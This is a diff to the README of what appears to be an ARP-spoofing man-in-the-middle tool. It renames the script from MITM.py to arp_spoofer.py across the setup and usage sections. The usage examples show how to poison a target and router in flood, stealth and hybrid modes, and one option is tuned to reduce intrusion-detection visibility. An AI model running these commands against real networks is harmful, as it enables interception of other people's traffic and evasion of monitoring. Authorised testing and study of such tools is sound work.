@@ -286,7 +286,7 @@ sudo apt install python3-scapy
 bash
 sudo setcap cap_net_raw+eip $(which python3)
 # Run without sudo (capability is on the interpreter binary)
-python3 MITM.py 192.168.1.6 192.168.1.1 -i eth0 -m hybrid
+python3 arp_spoofer.py 192.168.1.6 192.168.1.1 -i eth0 -m hybrid
 
 ### Enable IP Forwarding (required for MITM — do NOT skip)
 bash
@@ -305,7 +305,7 @@ sudo sysctl -p
 ## Usage
 
 
-usage: MITM.py [-h] [-i IFACE] [-m {flood,stealth,hybrid}] [-s]
+usage: arp_spoofer.py [-h] [-i IFACE] [-m {flood,stealth,hybrid}] [-s]
                [--interval INTERVAL] [--burst BURST]
                target_ip router_ip
 
@@ -328,16 +328,16 @@ options:
 
 bash
 # Full MITM, hybrid mode, custom interface
-sudo python3 MITM.py 192.168.1.6 192.168.1.1 -i eth0 -m hybrid
+sudo python3 arp_spoofer.py 192.168.1.6 192.168.1.1 -i eth0 -m hybrid
 
 # Full MITM, flood mode, faster interval
-sudo python3 MITM.py 10.0.0.50 10.0.0.1 -i enp3s0 -m flood --interval 0.5
+sudo python3 arp_spoofer.py 10.0.0.50 10.0.0.1 -i enp3s0 -m flood --interval 0.5
 
 # Stealth mode, router-only poison (single-target)
-sudo python3 MITM.py 192.168.1.6 192.168.1.1 -i wlan0 -m stealth -s
+sudo python3 arp_spoofer.py 192.168.1.6 192.168.1.1 -i wlan0 -m stealth -s
 
 # Hybrid, slow proactive rate (reduced IDS visibility), large pre-poison burst
-sudo python3 MITM.py 192.168.1.100 192.168.1.1 -i eth0 -m hybrid \
+sudo python3 arp_spoofer.py 192.168.1.100 192.168.1.1 -i eth0 -m hybrid \
     --interval 8.0 --burst 15
 
 ---
